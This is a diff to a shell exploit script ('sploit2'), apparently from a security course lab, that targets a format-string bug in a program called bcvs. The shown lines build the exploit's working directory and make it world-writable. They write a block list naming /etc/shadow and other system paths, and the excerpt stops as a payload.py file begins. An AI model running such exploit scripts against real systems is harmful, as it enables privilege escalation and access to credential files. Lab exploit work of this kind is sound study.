@@ -5,16 +5,22 @@
 ## main and then uses the printf vulnerability in writeLog
 ## to overwite the return pointer to go to this code.
 ## ----------------------------------------------------------- ##
+REPODIR=".bcvs"
+BLOCKLIST="block.list"
+BLOCKLISTPATH="${REPODIR}/${BLOCKLIST}"
 
-## Note: Since this exploit and sploit1 don't depend on faking the block.list
-## they should be removed eventually. This is just to allow us to execute them
-## from the repo
 rm -rf sploit2_dir
 mkdir -p sploit2_dir
 cd sploit2_dir
 mkdir -p .bcvs
 chmod 777 .bcvs
 touch .bcvs/block.list
+
+#blocklist - Exact copy of the one in bcvs's directory
+echo $REPODIR > $BLOCKLISTPATH
+echo "/etc/" >> $BLOCKLISTPATH
+echo "/etc/shadow" >> $BLOCKLISTPATH
+echo "/sbin/" >> $BLOCKLISTPATH
 
 # ------------------- Create Scripts ------------------- #
 cat <<EOS > "payload.py"
